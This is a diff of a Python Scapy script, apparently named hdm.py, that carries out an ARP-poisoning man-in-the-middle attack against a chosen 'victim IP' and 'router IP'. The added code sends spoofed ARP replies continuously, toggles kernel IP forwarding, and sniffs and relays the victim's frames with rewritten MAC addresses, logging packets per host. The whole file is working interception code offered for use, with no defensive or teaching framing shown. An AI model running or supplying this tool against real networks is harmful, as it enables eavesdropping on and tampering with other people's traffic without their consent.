@@ -6,9 +6,25 @@ logging.getLogger("scapy.runtime").setLevel(1) # then restore them
 import argparse
 import signal
 import time
+import os
 import sys
 from contextlib import contextmanager
 import threading
+import fcntl, socket, struct
+
+def getHwAddr(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+    s.close()
+    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
+
+def getIpAddr(ifname):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    info = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 
+        0x8915, struct.pack('256s', ifname[:15]))[20:24])
+    s.close()
+    return info
+
 
 def sniff(count=0, store=1, offline=None, prn = None, lfilter=None, L2socket=None, timeout=None, stopperTimeout=None, stopper = None, *arg, **karg):
     """Sniff packets
@@ -95,11 +111,15 @@ def myExit(status):
 def parse_args():
     help_message = "Usage: ./hdm.py -v V -r R [-h]\n where :\n V is victim IP\n R is router IP"
     parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument("-i", "--interface")
     parser.add_argument("-v", "--victimIP")
     parser.add_argument("-r", "--routerIP")
     parser.add_argument("-h", "--help", action="store_true")
     if parser.parse_args().help:
         print help_message
+        exit(0)
+    if not parser.parse_args().interface:
+        print " > network interface not specified | use -h for more info"
         exit(0)
     if not parser.parse_args().victimIP:
         print " > victim IP not specified | use -h for more info"
@@ -131,7 +151,6 @@ def restore(routerIP, victimIP, routerMAC, victimMAC):
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
     print "\r > network defaults restored"
-    myExit(0)
 
 def test(pkt):
     data = [method for method in dir(pkt) if callable(getattr(pkt, method))]
@@ -150,12 +169,11 @@ class Logger(threading.Thread):
 
     def run(self):
         self.canRun = True
-        sniff(prn=self.parsePacket, store=0, stopperTimeout=1, stopper=self.stopper)
+        sniff(prn=self.parsePacket, filter="icmp", store=0, stopperTimeout=1, stopper=self.stopper)
 
     def parsePacket(self, pkt):
-        # test(pkt)
-        # exit(0)
-        print pkt.summary()
+        # print pkt.show()
+        print pkt.sprintf("%IP.src%"), "->", pkt.sprintf("%IP.dst%")
         mac = pkt.sprintf("%Ether.src%")
         fileName = "./logs/" + mac.replace(':', '_')
         logFile = open(fileName, 'a+')
@@ -166,6 +184,68 @@ class Logger(threading.Thread):
             pkt.show()
         logFile.write('\n')
         logFile.close()
+
+    def stop(self):
+        self.canRun = False
+        print "Logger STOP"
+
+class Poisoner(threading.Thread):
+    def __init__(self, victimIP, victimMAC, routerIP, routerMAC):
+        self.victimIP = victimIP
+        self.victimMAC = victimMAC
+        self.routerIP = routerIP
+        self.routerMAC = routerMAC
+        self.canRun = False
+        super(Poisoner, self).__init__()
+
+    def run(self):
+        self.canRun = True
+        while self.canRun:
+            send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC), verbose=0)
+            send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC), verbose=0)
+            time.sleep(1.5)
+
+    def stop(self):
+        self.canRun = False
+        print "Poisoner STOP"
+
+class Editor(threading.Thread):
+    def __init__(self, attackerIP, attackerMAC, victimIP, victimMAC, routerIP, routerMAC):
+        self.attackerIP = attackerIP
+        self.attackerMAC = attackerMAC
+        self.victimIP = victimIP
+        self.victimMAC = victimMAC
+        self.routerIP = routerIP
+        self.routerMAC = routerMAC
+        self.canRun = False
+        # self.null = open(os.devnull, "w")
+        super(Editor, self).__init__()
+
+    def stopper(self):
+        return not self.canRun
+
+    def run(self):
+        self.canRun = True
+        sniff(prn=self.parsePacket, store=0, stopperTimeout=1, stopper=self.stopper)
+
+    def parsePacket(self, pkt):
+        # print pkt.sprintf("%IP.src%"), "to", pkt.sprintf("%IP.dst%")
+        # print pkt.sprintf("%Ether.src%"), "to", pkt.sprintf("%Ether.dst%")
+        if self.routerMAC == pkt.sprintf("%Ether.src%"):
+             # and self.victimIP == pkt.sprintf("%IP.dst%")
+            pkt[Ether].dst = self.victimMAC
+            pkt[Ether].src = self.attackerMAC
+            print "TO THE VICTIM"
+            sendp(pkt, verbose=0)
+            print "v success"
+        elif self.victimMAC == pkt.sprintf("%Ether.src%"):
+            # and self.attackerIP != pkt.sprintf("%IP.dst%")
+            pkt[Ether].dst = self.routerMAC
+            pkt[Ether].src = self.attackerMAC
+            print "TO THE GATEWAY"
+            sendp(pkt, verbose=0)
+            print "g success"
+
         # self.stop()
         # if pkt.haslayer(Raw):
         #     if "image1" in pkt[Raw].load:
@@ -180,8 +260,10 @@ class Logger(threading.Thread):
         # exit(0)
 
     def stop(self):
+        # self.null.close()
         self.canRun = False
-        print "STOPING"
+        print "Editor STOP"
+
 
 def main(args):
     print " > HDM start"
@@ -190,32 +272,57 @@ def main(args):
         myExit(0)
     routerIP = args.routerIP
     victimIP = args.victimIP
+    interface = args.interface
     print "routerIP:", routerIP
     print "victimIP:", victimIP
+    print "interface:", interface
     routerMAC = originalMAC(args.routerIP)
     victimMAC = originalMAC(args.victimIP)
-    print "routerMAC:", routerMAC
-    print "victimMAC:", victimMAC
+    attackerMAC = getHwAddr(interface)
+    attackerIP = getIpAddr(interface)
     if routerMAC == None:
         print "Could not find router MAC address."
         myExit(0)
     if victimMAC == None:
         print "Could not find victim MAC address."
         myExit(0)
-    # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
-    #     ipf.write('1\n')
+    if attackerMAC == None:
+        print "Could not find attacker MAC address."
+        myExit(0)
+    if attackerIP == None:
+        print "Could not find attacker IP address"
+        myExit(0)
+    print "routerMAC:", routerMAC
+    print "victimMAC:", victimMAC
+    print "attackerMAC:", attackerMAC
+    print "attackerIP:", attackerIP
     def signal_handler(signal, frame):
         print ""
+        # restore(routerIP, victimIP, routerMAC, victimMAC)
         log.stop(); # stop thread
+        poi.stop(); # stop poisoner
+        edi.stop(); # stop thread
+        myExit(0)
+
         # with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
         #     ipf.write('1\n')
-        restore(routerIP, victimIP, routerMAC, victimMAC)
     signal.signal(signal.SIGINT, signal_handler)
+
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+        ipf.write('1\n')
 
     log = Logger()
     log.start() # Log thread start
-    print " > poisoning in progress"
+    poi = Poisoner(victimIP, victimMAC, routerIP, routerMAC)
+    poi.start() # Poisoner start
+
+    time.sleep(0.1)
+    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
+        ipf.write('0\n')
+    edi = Editor(attackerIP, attackerMAC, victimIP, victimMAC, routerIP, routerMAC)
+    edi.start() # Forwarder + Editor
+
+    print " > HDM in progress"
     while 1:
-        poison(routerIP, victimIP, routerMAC, victimMAC)
-        time.sleep(1.5)
+        pass
 main(parse_args())
